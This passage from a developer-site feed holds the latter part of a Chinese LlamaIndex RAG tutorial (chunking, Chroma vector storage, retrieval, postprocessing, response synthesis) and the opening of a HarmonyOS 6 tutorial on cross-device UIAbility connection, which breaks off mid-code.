<p>1、首先定义了<strong>分块逻辑</strong>，示例使用Token计数的分块方式，默认是按完整句子拆分的SentenceSplitter类，它们都属于NodeParser的子类，用于将Document拆分成Node（Node表示Document的一个分块“chunk”，可以是文本或图片等）；在LlamaIndex中，不管是分块XxxSplitter类、提取元数据XxxExtractor类（示例未体现）、向量化Node数据XxxEmbedding类，它们都属于transformations，在解析Document时，可以指定多个，transformations是一个列表。</p>
<p>2、定义<strong>向量化模型</strong>为千问的text-embedding-v2，LlamaIndex默认使用的OpenAI的text-embedding-ada-002模型，这和框架的起源有关，一开始就是为了解决OpenAI系列模型相关问题。</p>
<p>3、创建<strong>向量化存储库</strong>，示例使用的是开源向量库chroma，指定存储目录和集合名。</p>
<p>4、定义<strong>Index（由Document组成的数据结构）</strong> ，并指定文档Documents、转换列表transformations、向量化模型及每批次数量、向量化存储库。VectorStoreIndex是LlamaIndex中最常见的索引类型，通过将Document拆分成Node，然后进行向量化每个Node，为后续语义检索做准备。</p>
<p>示例代码中定义的所有组件，在LlamaIndex中都有默认的实现，我们可以通过Settings查询，同时也可以通过Settings进行设置默认值，如下所示：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> llama_index.core <span class="hljs-keyword">import</span> Settings
<span class="hljs-keyword">import</span> os
<span class="hljs-comment"># 随便设置值，不然会报错找不到apiKey</span>
os.environ[<span class="hljs-string">"OPENAI_API_KEY"</span>] = <span class="hljs-string">"sk-..."</span>
<span class="hljs-comment"># 默认使用OpenAI的text-embedding-ada-002模型</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Settings.embed_model :<span class="hljs-subst">{Settings.embed_model}</span>"</span>)
<span class="hljs-comment"># 默认使用的SentenceSplitter，这三个取得都是相同的默认node_parser</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Settings.transformations :<span class="hljs-subst">{Settings.transformations}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Settings.text_splitter :<span class="hljs-subst">{Settings.text_splitter}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Settings.node_parser :<span class="hljs-subst">{Settings.node_parser}</span>"</span>)
<span class="hljs-comment"># global可以通过这种方式设置</span>
<span class="hljs-comment"># Settings.text_splitter = text_splitter</span>
</code></pre>
<p>上面我们已经把数据进行了向量化存储，如果想要基于存储的向量数据构建Index索引，可以使用如下方式，不用再次经过一遍上面的流程处理数据了：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 从向量库中创建index，指定向量库和模型</span>
<span class="hljs-attr">index</span> = VectorStoreIndex.from_vector_store(
<span class="hljs-attr">vector_store</span>=vector_store,
<span class="hljs-attr">embed_model</span>=dashscope_embed_model,
)
</code></pre>
<p>1、有关Document和Node介绍：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.llamaindex.ai%2Fpython%2Fframework%2Fmodule" target="_blank" title="https://developers.llamaindex.ai/python/framework/module" ref="nofollow noopener noreferrer">developers.llamaindex.ai/python/fram…</a>_guides/loading/documents_and_nodes/</p>
<p>类定义见：llama_index.core.schema</p>
<p>2、chroma开源向量库：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchroma-core%2Fchroma" target="_blank" title="https://github.com/chroma-core/chroma" ref="nofollow noopener noreferrer">github.com/chroma-core…</a></p>
<p>3、Index不同的索引类型和检索介绍：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.llamaindex.ai%2Fpython%2Fframework%2Fmodule" target="_blank" title="https://developers.llamaindex.ai/python/framework/module" ref="nofollow noopener noreferrer">developers.llamaindex.ai/python/fram…</a>_guides/indexing/index_guide/#vector-store-index</p>
<p><strong>检索查询</strong></p>
<p>有了数据也进行了向量化存储，并得到了Index索引对象，现在就可以进行检索并加入大模型上下文，回答问题。LlamaIndex的检索查询包括三步骤：<strong>检索Node -&gt; 后置处理过滤Node -&gt; 响应合成</strong></p>
<p><strong>1、仅检索</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 上文得到的index索引对象</span>
<span class="hljs-attr">retriever</span> = index.as_retriever()
<span class="hljs-attr">nodes</span> = retriever.retrieve(<span class="hljs-string">"育儿方式"</span>)
print(f"len:{len(nodes)} nodes:{nodes<span class="hljs-section">[0]</span>.text}")
<span class="hljs-comment"># 另一种方式：直接定义VectorIndexRetriever，指定index</span>
<span class="hljs-attr">retriever</span> = VectorIndexRetriever(
<span class="hljs-attr">index</span>=index,
<span class="hljs-attr">similarity_top_k</span>=<span class="hljs-number">1</span>, <span class="hljs-comment"># 召回一条数据</span>
)
<span class="hljs-attr">nodes</span> = retriever.retrieve(<span class="hljs-string">"育儿方式"</span>)
print(f"len:{len(nodes)} nodes:{nodes<span class="hljs-section">[0]</span>.text}")
</code></pre>
<p>示例使用index的as_retriever()方法得到VectorIndexRetriever，然后调用retrieve方法来检索node列表。直接定义VectorIndexRetriever效果一样。</p>
<p><strong>2、后置处理过滤Node</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 导入postprocessor</span>
from llama_index.core.postprocessor import KeywordNodePostprocessor, SimilarityPostprocessor
<span class="hljs-attr">node_postprocessors</span>=[
<span class="hljs-comment"># 相似性</span>
SimilarityPostprocessor(
similarity_cut<span class="hljs-literal">off</span>=<span class="hljs-number">0.1</span>
)
]
<span class="hljs-attr">query</span> = index.as_query_engine(llm=llm,
<span class="hljs-attr">node_postprocessors</span>=node_postprocessors)
</code></pre>
<p>示例使用了相似性分数过滤Node，过滤后把更少的Node信息作为上下文传递给大模型，减少大模型的Token数量以及降低响应时间。更多后置处理器见下面地址。</p>
<p><strong>3、响应合成-检索后发起大模型对话</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 查询</span>
from llama_index.llms.deepseek import DeepSeek
<span class="hljs-attr">llm</span> = DeepSeek(model=<span class="hljs-string">"deepseek-chat"</span>,
<span class="hljs-attr">api_key</span>=<span class="hljs-string">"sk-..."</span>)
from llama_index.core.response_synthesizers import ResponseMode
from llama_index.core import get_response_synthesizer
<span class="hljs-comment"># 定义响应合成逻辑，默认是ResponseMode.COMPACT</span>
<span class="hljs-comment"># "compact": 合并Node作为上下文，如果超长，则使用refine提炼，减少模型的请求次数，最终借助生成一个答案</span>
<span class="hljs-attr">response_synthesizer</span> = get_response_synthesizer(
<span class="hljs-attr">response_mode</span>=ResponseMode.COMPACT
)
<span class="hljs-attr">query</span> = index.as_query_engine(llm=llm,
<span class="hljs-attr">response_synthesizer</span>=response_synthesizer)
print(query.query("育儿方式?"))
</code></pre>
<p>示例通过使用index的as_query_engine()方法得到query引擎，并指定<strong>响应合成模式“compact”</strong> ，这个也是默认模式，含义见上代码注释，最后调用query方法借助LLM生成答案。</p>
<p>as_query_engine会获取无状态的查询引擎，另有as_chat_engine支持多轮对话的有状态查询引擎。</p>
<p>compact是其中一种合成模式，让ChatGPT基于官方文档生成的不同模式的对照表，供参考：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abd1ca0052d54e9f9202e00fd43a1656~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764594827&amp;x-signature=DQoMaN4UKokHtYEFusbwRAVvUv8%3D" alt="" loading="lazy"/></p>
<p>为什么会有不同的响应合成模式呢？</p>
<p>是因为 RAG 里拿到的文档往往是多个 chunk，而 LLM 的 prompt 有长度限制。</p>
<p>所以 LlamaIndex 提供了多种“怎样合成答案”的策略。</p>
<p>不同的后置过滤器：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.llamaindex.ai%2Fpython%2Fframework%2Fmodule" target="_blank" title="https://developers.llamaindex.ai/python/framework/module" ref="nofollow noopener noreferrer">developers.llamaindex.ai/python/fram…</a>_guides/querying/node_postprocessors/node_postprocessors/</p>
<p>不同响应合成模式：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.llamaindex.ai%2Fpython%2Fframework%2Fmodule" target="_blank" title="https://developers.llamaindex.ai/python/framework/module" ref="nofollow noopener noreferrer">developers.llamaindex.ai/python/fram…</a>_guides/querying/response_synthesizers/</p>
<p>及对应代码类型定义：llama_index.core.response_synthesizers.type.ResponseMode</p>
<h2 data-id="heading-3"><strong>04 总结</strong></h2>
<p>从整体来看，LlamaIndex 已经构建出一个覆盖 <strong>数据接入 → 文本解析 → 向量化与存储 → 检索策略 → 响应生成</strong> 的完整 RAG 技术栈，提供了高度模块化、可自由组合的能力。</p>
<p>本文展示的示例仅是 LlamaIndex 功能体系中的一小部分。更多丰富的索引类型、检索模式、数据连接器，以及企业级场景的模板与实践，可以在官方文档或 LlamaHub 中学习和阅读。</p>
<p>值得一提的是，除了 RAG 相关组件外，<strong>LlamaIndex 还提供了 基于事件驱动的 Workflow 工作流 与 Agent 智能体 能力</strong>，能够进一步支持复杂任务编排、多模型协作等更高级的应用模式。这些在后续文章中逐一展开。</p>
<h3 data-id="heading-4">学习资源推荐</h3>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【HarmonyOS 6】UIAbility跨设备连接详解（分布式软总线运用）]]></title>    <link>https://juejin.cn/post/7575897635138011136</link>    <guid>https://juejin.cn/post/7575897635138011136</guid>    <pubDate>2025-11-24T13:31:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575897635138011136" data-draft-id="7576105458807439360" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【HarmonyOS 6】UIAbility跨设备连接详解（分布式软总线运用）"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-11-24T13:31:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GeorgePanda"/> <meta itemprop="url" content="https://juejin.cn/user/1239904847930654"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【HarmonyOS 6】UIAbility跨设备连接详解（分布式软总线运用）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1239904847930654/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GeorgePanda
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T13:31:50.000Z" title="Mon Nov 24 2025 13:31:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">【HarmonyOS 6】UIAbility跨设备连接详解（分布式软总线运用）</h2>
<h3 data-id="heading-1">一、前言</h3>
<p>我对于分布式软总线相当的亲切。2022年搞开源鸿蒙的时候，就经常和分布式软总线打交道。在HarmonyOS中，UIAbility跨设备连接，其实就是对底层开源鸿蒙，分布式软总线的能力封装。</p>
<h3 data-id="heading-2">二、首先理解跨设备链接的步骤</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae6115adcf884c769cd876808f415ba7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2VvcmdlUGFuZGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764595910&amp;x-signature=knzdpWi8hSG3jKBXJGwjFCkYMLg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>首先由Distributed Service Kit提供该能力的封装。</p>
<p>在进行跨设备链接之前，我们要对设备进行互信操作。这个在鸿蒙里叫做分布式设备管理，包含了设备的发现，配对，可信查询，解除配对等。<strong>详情可参见我之前写的文章：【HarmonyOS 5】鸿蒙分布式协同应用开发详解</strong></p>
<p>进行完上面的可信操作，我们才能对于设备间的链接通信做处理。</p>
<h3 data-id="heading-3">三、专有名词理解：</h3>
<p><strong>DMS（Distributedsched Management Service）：</strong>
分布式组件管理框架，相当于跨设备协同的“中间人”，负责管理组件和建立连接</p>
<p><strong>UIAbility：</strong>
应用的界面交互核心，管生命周期、用户交互和界面渲染，跨设备协同本质就是两台设备的UIAbility在“对话”</p>
<h3 data-id="heading-4">四、环境准备步骤</h3>
<p>工欲善其事，先把环境搭好：
1、硬件：两台能登录华为账号的设备（A和B），需要支持API 18
2、开发工具：DevEco Studio 4.1及以上，public-SDK更新到API 18+
3、设备连接：用USB线把两台设备连到PC，打开蓝牙让设备互相识别组网
4、验证组网：PC端执行shell命令，显示“remote device num = 1”就是组网成功</p>
<pre><code class="hljs language-shell" lang="shell">hdc shell
hidumper -s 4700 -a "buscenter -l remote_device_info"
</code></pre>
<p>也可通过前置步骤的分布式设备管理，来验证设备的可信。</p>
<h3 data-id="heading-5">五、源码步骤拆解：</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/659948c1277d49d184925e22797b4aa6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2VvcmdlUGFuZGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764595910&amp;x-signature=CEhr7hgvAzsnGruuJAoPTdtpBvI%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h4 data-id="heading-6">1、 导入核心模块</h4>
<p>首先要导入分布式服务相关的Kit，不管是发起端还是接收端都需要：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { abilityConnectionManager, distributedDeviceManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.DistributedServiceKit'</span>;
<span class="hljs-keyword">import</span> { common, <span class="hljs-title class_">AbilityConstant</span>, <span class="hljs-title class_">UIAbility</span>, <span class="hljs-title class_">Want</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;
<span class="hljs-keyword">import</span> { hilog } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.PerformanceAnalysisKit'</span>;
</code></pre>
<h4 data-id="heading-7">2、 发现目标设备（设备A侧）</h4>
<p>设备A要先找到设备B的networkId，作为连接的关键参数：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">dmClass</span>: distributedDeviceManager.<span class="hljs-property">DeviceManager</span>;

<span class="hljs-comment">// 初始化设备管理实例</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">initDmClass</span>(<span class="hljs-params"/>): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">try</span> {
    dmClass = distributedDeviceManager.<span class="hljs-title function_">createDeviceManager</span>(<span class="hljs-string">'com.example.remotephotodemo'</span>);
  } <span class="hljs-keyword">catch</span> (err) {
    hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'创建设备管理实例失败: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(err));
  }
}

<span class="hljs-comment">// 获取设备B的networkId</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getRemoteDeviceId</span>(<span class="hljs-params"/>): <span class="hljs-built_in">string</span> | <span class="hljs-literal">undefined</span> {
  <span class="hljs-title function_">initDmClass</span>();
  <span class="hljs-keyword">if</span> (!dmClass) <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;
  
  hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'开始查找远程设备'</span>);
  <span class="hljs-keyword">const</span> deviceList = dmClass.<span class="hljs-title function_">getAvailableDeviceListSync</span>();
  
  <span class="hljs-keyword">if</span> (!deviceList || deviceList.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'未找到可用设备'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;
  }
  
  <span class="hljs-comment">// 这里取第一个设备，实际开发可做设备选择列表</span>
  <span class="hljs-keyword">return</span> deviceList[<span class="hljs-number">0</span>].<span class="hljs-property">networkId</span>;
}
</code></pre>
<h4 data-id="heading-8">3、创建会话并连接（两端操作不同）</h4>
<h5 data-id="heading-9">设备A（发起端）：创建会话+发起连接</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@StorageLink</span>(<span class="hljs-string">'sessionId'</span>) <span class="hljs-attr">sessionId</span>: <span class="hljs-built_in">number</span> = -<span class="hljs-number">1</span>;

<span class="hljs-comment">// 配置设备B的协同信息</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">peerInfo</span>: abilityConnectionManager.<span class="hljs-property">PeerInfo</span> = {
  <span class="hljs-attr">deviceId</span>: <span class="hljs-title function_">getRemoteDeviceId</span>()!, <span class="hljs-comment">// 设备B的networkId</span>
  <span class="hljs-attr">bundleName</span>: <span class="hljs-string">'com.example.remotephotodemo'</span>, <span class="hljs-comment">// 必须和设备B应用一致</span>
  <span class="hljs-attr">moduleName</span>: <span class="hljs-string">'entry'</span>,
  <span class="hljs-attr">abilityName</span>: <span class="hljs-string">'EntryAbility'</span>,
  <span class="hljs-attr">serviceName</span>: <span class="hljs-string">'collabTest'</span> <span class="hljs-comment">// 自定义服务名，两端要一致</span>
};

<span class="hljs-comment">// 连接配置</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">connectOptions</span>: abilityConnectionManager.<span class="hljs-property">ConnectOptions</span> = {
  <span class="hljs-attr">needSendData</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">startOptions</span>: abilityConnectionManager.<span class="hljs-property">StartOptionParams</span>.<span class="hljs-property">START_IN_FOREGROUND</span>,
  <span class="hljs-attr">parameters</span>: { <span class="hljs-string">"newKey1"</span>: <span class="hljs-string">"value1"</span> }
};

<span class="hljs-comment">// 发起连接</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">connectRemoteAbility</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> context = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getUIContext</span>().<span class="hljs-title function_">getHostContext</span>();
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 创建会话，获取sessionId</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sessionId</span> = abilityConnectionManager.<span class="hljs-title function_">createAbilityConnectionSession</span>(
      <span class="hljs-string">"collabTest"</span>, 
      context, 
      peerInfo, 
      connectOptions
    );
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`创建会话成功，sessionId: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.sessionId}</span>`</span>);
    
    <span class="hljs-comment">// 发起连接（会拉起设备B的应用）</span>
    <span class="hljs-keyword">const</span> connectResult = <span class="hljs-keyword">await</span> abilityConnectionManager.<span class="hljs-title function_">connect</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">sessionId</span>);
    <span class="hljs-keyword">if</span> (!connectResult.<span class="hljs-property">isConnected</span>) {
      hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'连接失败'</span>);
      <span class="hljs-keyword">return</span>;
    }
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'连接成功'</span>);
  } <span class="hljs-keyword">catch</span> (error) {
    hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`连接异常: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(error)}</span>`</span>);
  }
}
</code></pre>
<h5 data-id="heading-10">设备B（接收端）：被拉起后接受连接</h5>
<p>设备A发起连接后，设备B的应用会被协同拉起，触发<code>onCollaborate</code>生命周期函数：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntryAbility</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">UIAbility</span> {
  <span class="hljs-title function_">onCreate</span>(<span class="hljs-attr">want</span>: <span class="hljs-title class_">Want</span>, <span class="hljs-attr">launchParam</span>: <span class="hljs-title class_">AbilityConstant</span>.<span class="hljs-property">LaunchParam</span>): <span class="hljs-built_in">void</span> {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'应用启动'</span>);
  }

  <span class="hljs-comment">// 协同拉起时触发</span>
  <span class="hljs-title function_">onCollaborate</span>(<span class="hljs-attr">wantParam</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Object</span>&gt;): <span class="hljs-title class_">AbilityConstant</span>.<span class="hljs-property">CollaborateResult</span> {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'收到协同请求'</span>);
    <span class="hljs-keyword">const</span> collabParam = wantParam[<span class="hljs-string">"ohos.extra.param.key.supportCollaborateIndex"</span>] <span class="hljs-keyword">as</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Object</span>&gt;;
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleCollaborate</span>(collabParam);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  }

  <span class="hljs-comment">// 处理协同连接</span>
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">handleCollaborate</span>(<span class="hljs-params">collabParam: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">Object</span>&gt;</span>) {
    <span class="hljs-keyword">const</span> sessionId = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createSessionFromParam</span>(collabParam);
    <span class="hljs-keyword">if</span> (sessionId === -<span class="hljs-number">1</span>) {
      hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'会话创建失败'</span>);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 获取协同token，必须传入acceptConnect</span>
    <span class="hljs-keyword">const</span> collabToken = collabParam[<span class="hljs-string">"ohos.dms.collabToken"</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>;
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> abilityConnectionManager.<span class="hljs-title function_">acceptConnect</span>(sessionId, collabToken);
      hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'接受连接成功'</span>);
      <span class="hljs-title class_">AppStorage</span>.<span class="hljs-title function_">setOrCreate</span>(<span class="hljs-string">'sessionId'</span>, sessionId);
    } <span class="hljs-keyword">catch</span> (error) {
